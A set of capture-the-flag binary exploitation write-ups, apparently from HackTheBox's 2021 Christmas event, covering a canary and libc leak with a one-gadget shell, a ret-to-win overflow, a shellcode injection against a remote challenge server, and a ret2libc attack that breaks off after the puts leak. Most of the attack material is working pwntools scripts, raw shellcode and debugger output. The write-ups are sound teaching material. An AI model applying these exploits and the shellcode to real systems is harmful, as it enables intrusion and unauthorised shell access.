<p>Disassembling the instructions at ($rip+0x3eb, $rip+0x3eb+10) show us that the main function begins at address <code>0x555555400dcf</code>, so we put a breakpoint here and remove our older breakpoint.</p>
<p>We can then continue the program, we should hit the main function.</p>
<h2 id="starting-the-exploitation-of-the-program"><a class="header" href="#starting-the-exploitation-of-the-program">Starting the exploitation of the program</a></h2>
<p>Looking at RAX before the call to <code>create</code> at address <code>0x555555400bd1</code>, knowing that <code>id 0</code> correspond to the first 2 bytes we read from <code>/dev/urandom</code> we can see that these bytes are 0x779f</p>
<p>Let's search for these bytes somewhere on the stack.</p>
<pre><code>pwndbg&gt; search -t short 0x779f
[stack]		0x7fffffffdbf6 0x365b3b3fb0ef779f
</code></pre>
<p>We see that the value read inside <code>/dev/urandom</code> begins at address 0x7fffffffdbf6,</p>
<p>Looking at the values on the stack around the address 0x7fffffffdbf6.</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6
0x7fffffffdbf6: 0x365b3b3fb0ef779f      0x6574616572633bf8
0x7fffffffdc06: 0x7ffff7e0de630000      0x0000000000140000
0x7fffffffdc16: 0x7ffff7f967600000      0x555555400f260000
0x7fffffffdc26: 0x7ffff7e0203a0000      0x0000000000000000
0x7fffffffdc36: 0x0000000000000000      0x0000000000000000
0x7fffffffdc46: 0x7fffffffdc800000      0x7fffffffdda80000
0x7fffffffdc56: 0x82bd5de3ae000000      0x7fffffffdc80e6fa
0x7fffffffdc66: 0x555555400dfe0000      0x7fffffffdda80000
0x7fffffffdc76: 0x0001000000010000      0x0000000000010000
0x7fffffffdc86: 0x7ffff7daafd00000      0x5555554000400000
0x7fffffffdc96: 0x555555400dcf0000      0x0001000000000000
0x7fffffffdca6: 0x7fffffffdda80000      0x0000000000000000
0x7fffffffdcb6: 0xd64dc4ec68470000      0x7fffffffdda8eb29
0x7fffffffdcc6: 0x555555400dcf0000      0x0000000000000000
0x7fffffffdcd6: 0x7ffff7ffbc400000      0x29b27dce68470000
0x7fffffffdce6: 0x39f89be6684714d6      0x7fff0000000014d6
</code></pre>
<p>We can see the bytes generated by <code>/dev/urandom</code> at address <code>0x7fffffffdbf6</code> are <code>0x365b3b3fb0ef779f</code>, and we know we are dealing with array of 16 bits each and we read 10 bytes in <code>/dev/urandom</code>, we can translate this string to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
</code></pre>
<p>Note that we miss id 4, which should be the last 2 bytes of the address just before <code>0x7fffffffdbf6</code> which is the address we can find the value <code>0x365b3b3fb0ef779f</code> on the stack.</p>
<p>We can print the last 2 missing bytes using the following command inside pwndbg</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6+2
0x7fffffffdbf8: 0x3bf8365b3b3fb0ef      0x0000657461657263
0x7fffffffdc08: 0x00007ffff7e0de63      0x0000000000000014
0x7fffffffdc18: 0x00007ffff7f96760      0x0000555555400f26
0x7fffffffdc28: 0x00007ffff7e0203a      0x0000000000000000
0x7fffffffdc38: 0x0000000000000000      0x0000000000000000
0x7fffffffdc48: 0x00007fffffffdc80      0x00007fffffffdda8
0x7fffffffdc58: 0xe6fa82bd5de3ae00      0x00007fffffffdc80
0x7fffffffdc68: 0x0000555555400dfe      0x00007fffffffdda8
0x7fffffffdc78: 0x0000000100000001      0x0000000000000001
0x7fffffffdc88: 0x00007ffff7daafd0      0x0000555555400040
0x7fffffffdc98: 0x0000555555400dcf      0x0000000100000000
0x7fffffffdca8: 0x00007fffffffdda8      0x0000000000000000
0x7fffffffdcb8: 0xeb29d64dc4ec6847      0x00007fffffffdda8
0x7fffffffdcc8: 0x0000555555400dcf      0x0000000000000000
0x7fffffffdcd8: 0x00007ffff7ffbc40      0x14d629b27dce6847
0x7fffffffdce8: 0x14d639f89be66847      0x00007fff00000000
</code></pre>
<p>Looking at the output  we can deduce that the last 2 missing bytes read from <code>/dev/urandom</code> are <code>0x3bf8</code>, we can then translate the whole value read from <code>/dev/urandom</code> to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
id 4: 0x3bf8
</code></pre>
<p>We can confirm the following by continuing our program in the debugger and input <code>id 1</code> then break just before our call to <code>create</code> at address <code>0x555555400d80</code>.</p>
<pre><code>pwndbg&gt; b *0x555555400d80
Breakpoint 4 at 0x555555400d80
</code></pre>
<p>Then let's add another breakpoint right before the function that asks us for input at address <code>0x555555400d1a</code></p>
<pre><code>pwndbg&gt; x/30i $rip-200
   0x555555400cb3:      lea    edi,[rip+0x236]        # 0x555555400eef
   0x555555400cb9:      mov    eax,0x0
   0x555555400cbe:      call   0x555555400970 &lt;open@plt&gt;
   0x555555400cc3:      mov    DWORD PTR [rbp-0x70],eax
   0x555555400cc6:      cmp    DWORD PTR [rbp-0x70],0xffffffff
   0x555555400cca:      jne    0x555555400ce2
   0x555555400ccc:      lea    rdi,[rip+0x229]        # 0x555555400efc
   0x555555400cd3:      call   0x5555554008e0 &lt;puts@plt&gt;
   0x555555400cd8:      mov    edi,0x0
   0x555555400cdd:      call   0x555555400990 &lt;exit@plt&gt;
   0x555555400ce2:      lea    rcx,[rbp-0x6a]
   0x555555400ce6:      mov    eax,DWORD PTR [rbp-0x70]
   0x555555400ce9:      mov    edx,0xa
   0x555555400cee:      mov    rsi,rcx
   0x555555400cf1:      mov    edi,eax
   0x555555400cf3:      mov    eax,0x0
   0x555555400cf8:      call   0x555555400940 &lt;read@plt&gt;
   0x555555400cfd:      lea    rdi,[rip+0x1fe]        # 0x555555400f02
   0x555555400d04:      mov    eax,0x0
   0x555555400d09:      call   0x555555400910 &lt;printf@plt&gt;
   0x555555400d0e:      lea    rax,[rbp-0x60]
   0x555555400d12:      mov    esi,0x100
   0x555555400d17:      mov    rdi,rax
   0x555555400d1a:      call   0x555555400aca
   0x555555400d1f:      lea    rax,[rbp-0x60]
   0x555555400d23:      mov    edx,0x3
   0x555555400d28:      lea    rsi,[rip+0x1d6]        # 0x555555400f05
   0x555555400d2f:      mov    rdi,rax
   0x555555400d32:      call   0x5555554008d0 &lt;strncmp@plt&gt;
   0x555555400d37:      test   eax,eax

pwndbg&gt; b *0x555555400aca
</code></pre>
<p>Then we can continue and confirm that <code>id 1</code> is equal to <code>0xb0ef</code></p>
<pre><code>pwndbg&gt; c
pwndbg&gt; c 
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
id 1

pwndbg&gt; c
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
create

pwndbg&gt; c
</code></pre>
<p>After this the program should have break at address <code>0x555555400d80</code> which is right before our call to <code>create</code> where we want to be.</p>
<p>Looking at eax show that we were right on our theory about how this program works.</p>
<pre><code>pwndbg&gt; i r eax
eax            0xb0ef              45295
</code></pre>
<h2 id="canaries"><a class="header" href="#canaries">Canaries</a></h2>
<p>Knowing we can leak 2 bytes from pretty much anywhere in our program, we can use this to leak the value of the stack canary and therefore bypass it easily.</p>
<pre><code>pwndbg&gt; canary
AT_RANDOM = 0x7fffffffe119 # points to (not masked) global canary value
Canary    = 0xe6fa82bd5de3ae00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffd988 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda48 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdaa8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdab8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdac8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdb18 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdbc8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdc58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdd18 ◂— 0xe6fa82bd5de3ae00
</code></pre>
<p>We can notice that valid canaries have the value <code>0xe6fa82bd5de3ae00</code> <em>note that this value change every time we run the program</em>, and we are looking particularly for one that is located after our <code>/dev/urandom bytes buffer</code> at address <code>0x7fffffffdbf6</code>, the reason why is that our input is treated as a unsigned integer which means we can't use any negative offsets.</p>
<p>We can use the stack canary that is located at address <code>0x7fffffffdc58</code> which is located after our buffer on the stack (0x7fffffffdc58 - 0x7fffffffdbf6 = 98).</p>
<p>We have 98 bytes of offset between the beginning of our canary and our <code>10 bytes</code> we read out of <code>/dev/urandom</code></p>
<p>Since we're dealing with nibbles, we are going to need to split our bytes in offset by 2 which give us a final offset of <code>49</code></p>
<p>We are also going to need to leak something from libc, something we know that is definitely on the stack is the return address back into <code>__libc_start_main</code> from the <code>main</code> function. Searching for it tells us that it is at the stack address <code>0x7fffffffdc88</code> on the stack.</p>
<pre><code>pwndbg&gt; bt
#0  0x0000555555400d80 in ?? ()
#1  0x0000555555400dfe in ?? ()
#2  0x00007ffff7daafd0 in __libc_start_call_main (main=main@entry=0x555555400dcf, argc=argc@entry=1, argv=argv@entry=0x7fffffffdda8) at ../sysdeps/nptl/libc_start_call_main.h:58
#3  0x00007ffff7dab07d in __libc_start_main_impl (main=0x555555400dcf, argc=1, argv=0x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdd98) at ../csu/libc-start.c:409
#4  0x00005555554009ea in ?? ()

pwndbg&gt; search -t qword 0x00007ffff7daafd0
[stack]         0x7fffffffdc88 0x7ffff7daafd0
</code></pre>
<p>We can now calculate the offset between the return address of <code>__libc_start_main</code> and our 10 bytes read from <code>/dev/urandom</code> the same way we did with canaries (0x7fffffffdc88 - 0x7fffffffdbf6 = 146).</p>
<p>Once again since we're dealing with <code>16 bits unsigned integer</code> we are going to need to split this value by 2, which will give us the final offset of <code>73</code>.</p>
<p>Now that we leak our canary we should be able to determine the offset of rip where our program crashes.</p>
<h2 id="writing-exploit"><a class="header" href="#writing-exploit">Writing Exploit</a></h2>
<p>With all the knowledge we've gained on this binary so far we should be ready to write an exploit script.</p>
<pre><code class="language-py">from pwn import *
import ctypes
from one_gadget import generate_one_gadget

charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;
stack_canary_offset = 49 # This is the offset we've obtained for the canary we choosed on the stack
stack___libc_start_main_offset = 73 # Since we need to leak something from libc we can leak the return address back into __libc_start_main from the main function
hashes = {} # We compute every possible hashes (65535) and add them to this array

# This function will leak the value at our offset argument.
def leak(p, offset, toggle=True):
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;id &quot; + str(offset).encode())
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;create&quot;)
    p.recvuntil(b&quot;Your key: &quot;)
    key = p.recvline().strip().decode()
    value = hashes[key]
    # correct for the one and zero collision.
    if value == 1 and toggle:
        value = 0
    
    log.info(f&quot;Offset {offset}: {key} ({hex(value)})&quot;)
    return value


# The function precompute will precompute every possible 2 bytes values that we read from /dev/urandom
def precompute():
    libc = ctypes.cdll.LoadLibrary(&quot;libc.so.6&quot;)
    global hashes
    # loop in all 2 bytes possibilities (0x0000, 0xffff), this will generate all possibilities generated by /dev/urandom
    for i in range(0xffff+1):
        libc.srand(i)
        val = &quot;&quot;
        for j in range(32):
            val += charset[libc.rand() % len(charset)]
        hashes[val] = i
    log.info(f&quot;Computed {len(hashes)} hashes.&quot;)

def main():
    precompute()

    # Find themagicone gadget in the provided libc
    libc_path = &quot;./libc-2.27.so&quot;
    magic_offset = next(generate_one_gadget(libc_path))
    log.info(f&quot;Found magic one gadget at offset: {hex(magic_offset)}&quot;)

    # Get the __libc_start_main offset
    libc_elf = ELF(libc_path)
    __libc_start_main_offset = libc_elf.libc_start_main_return
    log.info(f&quot;__libc_start_main_offset {hex(__libc_start_main_offset)}&quot;)

    # start the program
    p = process(&quot;./newbie&quot;)

    # Leak the canary
    canary = 0
    for i in range(4): # Canary is 8 bytes, but we read only 2 of em each time, so we loop 4 time and do some bit shifting arithmetic
        canary += (leak(p, stack_canary_offset+i)) &lt;&lt; (16 * i) # 16 * 4 = 64 bits (8 bytes).
    log.info(f&quot;Leaked Canary {hex(canary)}&quot;)

    # leak the libc start main return value
    __libc_start_main = 0
    for i in range(4):
        __libc_start_main += (leak(p, stack___libc_start_main_offset + i)) &lt;&lt; (16 * i) # 2 bytes at (stack__libc_start_main_offset + i)
    log.info(f&quot;Leaked __libc_start_main: {hex(__libc_start_main)}&quot;)
    # Get the libc base offset
    libc_base = __libc_start_main - __libc_start_main_offset
    log.info(f&quot;libc base address {hex(libc_base)}&quot;)
    # Calculate magic offset address using libc base
    magic = libc_base + magic_offset
    log.info(f&quot;Magic one gadget address : {hex(magic)}&quot;)

    # Trigger Buffer Overflow
    p.recvuntil(b&quot;&gt; &quot;)
    payload = b&quot;A&quot; * 88 + p64(canary) + p64(0x4242424242424242) + p64(magic)
    p.sendline(payload)
    # Quit to return
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;quit&quot;)
    log.success(&quot;Shell spawned! Enjoy !&quot;)

    p.interactive()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-mrsnowy"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-mrsnowy">Cyber Santa is Coming to Town (Pwn Mr.Snowy)</a></h1>
<p>So this was the first pwn challenge of the hackthebox 2021 christmas hacking ctf, it was <strong>too much simple</strong> i think but was a great practice whatsoever.</p>
<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving the Challenge</a></h2>
<p>The program starts by telling us, we are in Santa's garden, and there is a suspicious snowman.
We are then asked between 2 choices :</p>
<pre><code>- Investigate
- Let it be
</code></pre>
<p>If you choose Let it be, the program will just quit without doing anything, however if you use the Investigate button the program will use the <strong>read</strong> syscall to <strong>read 0x108 bytes inside a buffer of 64 bytes</strong>, this is a regular buffer overflow, next step was to find the offset at which we can overwrite the return address of the current function we're in. </p>
<p>For this i have sent a <strong>cyclic pattern of 500 bytes</strong> to our program, running it in gdb shows us that the return address starts to be overwritten after 72 bytes, this means we need an offset of <strong>72 bytes before our shellcode or whatever exploit we will use</strong>.</p>
<p>After looking at what i can now do, i found this function called <strong>deactivate_camera</strong>, the body of the functions lookslike it reads a flag file and output it to stdout.</p>
<p>Changing the return address for the <strong>deactivate_camera</strong> function effectively reads the flag, we can now write a python script to automatically solve this challenge :</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;

elf = ELF(&quot;/challenge/pwn_mr_snowy/mr_snowy&quot;)
io = elf.process()

win_function_addr = elf.sym[&quot;deactivate_camera&quot;]

payload = b&quot;A&quot; * 72 + p64(win_function_addr) 

io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
io.sendlineafter(b&quot;&gt; &quot;, payload)
io.interactive()
</code></pre>
<p>This code should return inside the <strong>deactivate_camera</strong> function and therefore print your flag :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-sleigh"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-sleigh">Cyber Santa is Coming to Town (Pwn Sleigh)</a></h1>
<p>Sleigh was i think the second exploitation challenge of the Hackthebox Christmas 2021 event, it was a pretty great challenge, a bit easy once again but it was fun. The name of the challenge is also pretty accurate since we will need to &quot;<strong>sleigh</strong>&quot; back to a variable to execute our shellcode.</p>
<h2 id="solving-the-challenge-1"><a class="header" href="#solving-the-challenge-1">Solving The Challenge</a></h2>
<p>Okay so when running the challenge, we are asked if we wan't to <strong>repair</strong> the sleigh or <strong>abandon</strong> it. Abandoning it will cause the challenge to exit, while repair will asks us for more input.</p>
<p>When we select repair, the program leaks the address of our input, then the  program calls read and asks us for the input. The thing is, we have the address of our input, and since we read <strong>0xa4 bytes</strong> in a buffer of <strong>64 bytes</strong> we can overflow the return address, we can write some shellcode at the beginning of our input, put a little bit of padding and overwrite the return address of the current function for the address of our input, since the beginning of our input contains valid code, it should execute !</p>
<p>This challenge is great if your practicing shellcoding, you can pretty much write any kind of shellcode less than 72 bytes, put it at the beginning of your input and it should execute it.</p>
<p>As a test to see if my shellcode was working at the beginning i made the following shellcode which is just an exit syscall with a certain number, when a program exit you can usually check the exit number and therefore confirm if you were indeed able to inject code :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Clear Registers
    xor rdi, rdi
    # Syscall
    mov rax, 60
    mov rdi, 69
    syscall
</code></pre>
<p>To inject this code you would need to input the raw bytes of it at the beginning of your input, then put some padding with &quot;A&quot; until you reach 72 bytes, then it's time to overflow the return address, so you can just add the leaked address to your payload, and if you correctly overwritten the return address of the function it should execute your shellcode and exit with the code number 69.</p>
<p>To solve the challenge i used the following code :</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;

local = False

if local:
    io = pwn.process(&quot;./sleigh&quot;)
else:
    io = pwn.remote(&quot;178.62.75.187&quot;, 30496)

shellcode = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;

pwn.log.info(f&quot;Shellcode Length = {len(shellcode)}&quot;)
io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
io.recvuntil(b&quot;sleigh: &quot;)
addr = int(io.recvline().decode().strip(&quot;[&quot;).replace(&quot;]&quot;, &quot;&quot;), 16)
pwn.log.info(f&quot;Leaked Address {addr}&quot;)
payload = shellcode + (72 - len(shellcode)) * b&quot;A&quot; + pwn.p64(addr)
io.sendline(payload)
io.interactive()
</code></pre>
<p>Running this code either locally or remotely should drop you a shell, note that you can practice writing your own shellcode, but the problem with the read function is that it reads input until it encounters a new line, this means if you write shellcode for this challenge it can't contains any 0x0a opcodes, for those who study at ASU you should be pretty good evading filters on shellcode :P</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-naughty-list"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-naughty-list">Cyber Santa is Coming to Town (Pwn Naughty List)</a></h1>
<p>This challenge was remarkable because it was one of the simplest and most educative <code>ret2libc</code> challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a <code>libc.so.6</code> file, i knew it was ret2libc.</p>
<h2 id="preparing-the-challenge"><a class="header" href="#preparing-the-challenge">Preparing the Challenge</a></h2>
<p>Before starting the challenge you will need to make sure you have the right version of the linker and the right version of libc, usually you can check the string of the libc binary and search for a ubuntu version then you can run a docker on that right version.</p>
<pre><code>$ strings ./libc.so.6 | grep &quot;ubuntu&quot;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
</code></pre>
<p>Looking at the output we can see that our program was compiled using <code>ubuntu version 18.04</code>, you can run a docker with that specific version of ubuntu using the following command.</p>
<pre><code>$ docker run -it ubuntu:18.04
root@1e005e022242:/#
</code></pre>
<p>But for this challenge we will use <code>pwninit</code>, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting <code>pwninit</code> using the following command.</p>
<pre><code>$ cargo install pwninit
</code></pre>
<p>Then you can run pwninit in the directory of the vulnerable binary.</p>
<pre><code>$ pwninit
bin: ./naughty_list
libc: ./libc.so.6
ld: ./ld-2.27.so

copying ./naughty_list to ./naughty_list_patched
running patchelf on ./naughty_list_patched
</code></pre>
<p>You can either used the binary <code>pwninit</code> generated or patched the binary on your own, you would usually do this with the <code>patchelf</code> utility.</p>
<pre><code>$ patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 /challenge/pwn_naughty_list/libc.so.6 ./naughty_list
</code></pre>
<p>Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using <code>ldd</code> on your binary.</p>
<pre><code>$ ldd ./naughty_list
        linux-vdso.so.1 (0x00007ffee7b73000)
        /challenge/pwn_naughty_list/libc.so.6 (0x00007f1c32b1f000)
       ./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f1c32f17000)
</code></pre>
<p>We can confirm that our  challenge use the right linker and the right libc versions.</p>
<h2 id="solving-the-challenge-2"><a class="header" href="#solving-the-challenge-2">Solving the Challenge</a></h2>
<p>Solving this challenge will be a little longer than the previous writeups i've did so far since ret2libc is a little more complicated. So without hesitating let's solve this challenge.</p>
<p>First thing i will do is find the vulnerable point in the program, i suggest you open the binary in ghidra for that, or you can go in fully 1337 mode and use only gdb. (disassemblers exist for a good reason tho).</p>
<p>Looking at the main function we can see 4 different functions that asks for our input.
<img src="https://i.imgur.com/cgUkVpv.png" alt="Potentially Vulnerable Functions" /></p>
<p>Looking deeper into each of these functions we notice that the functions <code>get_name, get_surname, get_age</code>. However we do not have any restrictions on our last function <code>get_descr</code>.
<img src="https://i.imgur.com/GRBbFVq.png" alt="No Restrictions on get_descr input" /></p>
<p>We can also see in the screenshot that we read <code>0x3c0 bytes (960)</code> of input inside a buffer of <code>32 bytes</code> which is clearly vulnerable to a buffer overflow.</p>
<p>We can try to make our binary <code>SEGFAULT</code> by running it and sending a little more than ~32 bytes of input, let's try this in practice</p>
<pre><code>$ ./naughty_list

~ Ho Ho Ho Santa is here ~

       _______________
    0==( Naughty List (c==0
       '______________'|
         | Name        |
         | Gift        |
       __)_____________|
   0==(               (c==0
       '--------------'

[*] Enter your name    (letters only): penis
[*] Enter your surname (letters only): penis
[*] Enter your age (18-120): 69
[+] Name:    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[*] 🎅 will take a better look and hopefuly you will get your 🎁!
[1]    3876 segmentation fault (core dumped)  ./naughty_list
</code></pre>
<p>Running a cyclic string with our binary in gdb reveals that we overwrite our return address after <code>40 bytes of input</code>. We can start writing our exploit the following way.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40
</code></pre>
<p>Now the second step in a ret2libc attack is to leak the address of a functions in the .got section, this should be pretty simple to do.</p>
<p>Let's start by finding a <code>pop_rdi; ret</code> instruction using ropper, so we can align our stack before starting to do a <code>ropchain</code>.</p>
<pre><code>$ ropper -- --search &quot;pop rdi; ret&quot; --file ./naughty_list
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./naughty_list
0x0000000000401443: pop rdi; ret;
</code></pre>
<p>We see that at address <code>0x0000000000401443</code>, we have the <code>pop rdi; ret</code> instruction. We can take that value and add it into our python script.</p>
<pre><code class="language-py">pop_rdi = pwn.p64(0x0000000000401443)
</code></pre>
<p>Sometimes using <code>ret</code> instead of <code>pop rdi; ret</code> is a better idea, since it's totally doable you can search for a <code>ret</code> instruction in the binary and you can add it the same way we just did with <code>pop_rdi</code>.</p>
<p>Next thing we need to do is to find a function we want to leak the address of, so what i did was open <code>bpython or python</code>, and you can do the following to see the different functions available in the <code>.got</code> section.</p>
<pre><code>&gt;&gt;&gt; import pwn
&gt;&gt;&gt; e = pwn.ELF(&quot;./naughty_list&quot;)
[*] '/challenge/pwn_naughty_list/naughty_list'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
&gt;&gt;&gt; e.got
{'__libc_start_main': 6299632, '__gmon_start__': 6299640, 'stdout': 6299744, 'stdin': 6299760, 'toupper': 6299520, '
puts': 6299528, 'strlen': 6299536, 'printf': 6299544, 'memset': 6299552, 'alarm': 6299560, 'read': 6299568, 'srand':
6299576, 'strcmp': 6299584, 'time': 6299592, 'setvbuf': 6299600, '__isoc99_scanf': 6299608, 'fwrite': 6299616, 'ran
d': 6299624}
</code></pre>
<p>We can notice a few functions we can leak, but for this challenge we will simply use <code>puts</code>, so we can continue our script the following way.</p>
<pre><code class="language-py">puts_at_got = pwn.p64(e.got.puts)
</code></pre>
<p>And since we want to leak the address of that function we need to get the address of <code>puts</code> in the <code>plt</code> section, this will cause <code>puts</code> to be called with the address of <code>puts_at_got</code> as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.</p>
<pre><code class="language-py">puts_at_plt = pwn.p64(e.plt.puts)
</code></pre>
<p>Okay so now we can see if our script is able to leak the address of puts on the screen, your script should look like the following.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got
    puts_at_plt
]

io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;69&quot;)

io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.interactive()
</code></pre>
<p>Running the python script confirms that it indeed leaks the address of the puts function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4512
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0\xfa\xed3
[*] Got EOF while reading in interactive
</code></pre>
<p>Leaking the function is cool, but the program directly ends after that since our program don't have any valid instruction to execute, for this reason if we want to exploit the program we will need to make a jump into the vulnerable function <code>get_descr</code>. So we're going to add the address of the <code>get_descr</code> function after our call to puts in the plt.</p>
<pre><code class="language-py">get_descr = pwn.p64(e.symbols.get_descr)
</code></pre>
<p>Don't forget to add the line in the payload field after <code>puts_at_plt</code>.</p>
<pre><code class="language-py">payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]
</code></pre>
<p>You can rerun the program, and see that after leaking the address, it jump backs to our vulnerable function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4567
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0z֗\xd5

[*] Name of the gift you want and why you were good enough to deserve it: $ test
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
</code></pre>
<p>Notice how the program asks us a second time for the same vulnerable input, this means we successfully were able to jump back inside our vulnerable function.</p>
<p>Now we need our program to parse the leaked function address, for this we will need to do some trial and error with <code>recvline</code> until we have the right number of lines. After testing i know that i need to skip 6 lines before it leaks our input so you can add the following to your script.</p>
<pre><code>io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
</code></pre>
<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly, and that we were able to store it in a variable called <code>leak</code>.</p>
